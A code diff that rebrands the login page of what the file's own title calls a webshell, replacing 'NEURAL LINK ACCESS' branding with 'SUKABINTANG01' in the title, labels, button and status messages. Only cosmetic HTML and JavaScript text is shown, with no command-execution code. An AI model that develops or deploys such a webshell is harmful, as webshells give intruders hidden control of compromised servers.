@@ -78,7 +78,7 @@ if (is_logged_in()) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEURAL LINK ACCESS</title>
+    <title>WEBSHELL SUKABINTANG01</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Source+Code+Pro:wght@400;600&display=swap');
@@ -411,22 +411,22 @@ if (is_logged_in()) {
             <i class="fas fa-shield-alt"></i> SEC-LV5
         </div>
         <div class="security-level">
-            NEURAL FIREWALL ACTIVE
+            SUKABINTANG01 FIREWALL ACTIVE
         </div>
 
         <div class="login-header">
-            <div class="logo">◢ NEXUS ◣</div>
-            <div class="subtitle">NEURAL ACCESS POINT</div>
+            <div class="logo">◢ SUKABINTANG01◣</div>
+            <div class="subtitle">SUKABINTANG01 ACCESS ROOT</div>
         </div>
 
         <div class="terminal-line">> Initializing secure connection...</div>
         <div class="terminal-line">> Quantum encryption enabled</div>
-        <div class="terminal-line">> Awaiting neural authorization...</div>
+        <div class="terminal-line">> Awaiting sukabintang01 authorization...</div>
 
         <form id="loginForm" method="POST" action="">
             <div class="form-group">
                 <label class="form-label">
-                    <i class="fas fa-user-secret"></i> Neural ID
+                    <i class="fas fa-user-secret"></i> SUKABINTANG01 ID
                 </label>
                 <input type="text" name="user_id" class="form-input" placeholder="Enter your user identifier" required>
             </div>
@@ -439,7 +439,7 @@ if (is_logged_in()) {
             </div>
 
             <button type="submit" class="hack-button">
-                <i class="fas fa-brain"></i> INITIATE NEURAL LINK
+                <i class="fas fa-brain"></i> INITIATE SUKABINTANG01 ACCESS
             </button>
         </form>
 
@@ -449,7 +449,7 @@ if (is_logged_in()) {
             </div>
             <div class="loading" id="loading">
                 <div class="spinner"></div>
-                Establishing neural connection...
+                Establishing sukabintang01 connection...
             </div>
         </div>
     </div>
@@ -501,9 +501,9 @@ if (is_logged_in()) {
         }
 
         const statusMessages = [
-            'Status: Monitoring neural pathways | Encryption: Quantum | Threat Level: Green',
+            'Status: Monitoring sukabintang01 pathways | Encryption: Quantum | Threat Level: Green',
             'Status: Scanning for intrusions | Firewall: Active | Last Access: 00:42:13',
-            'Status: System optimal | Neural bandwidth: 98.7% | Uptime: 127 days'
+            'Status: System optimal | SukaBintang01 Bandwidth: 98.7% | Uptime: 127 days'
         ];
 
         setInterval(() => {
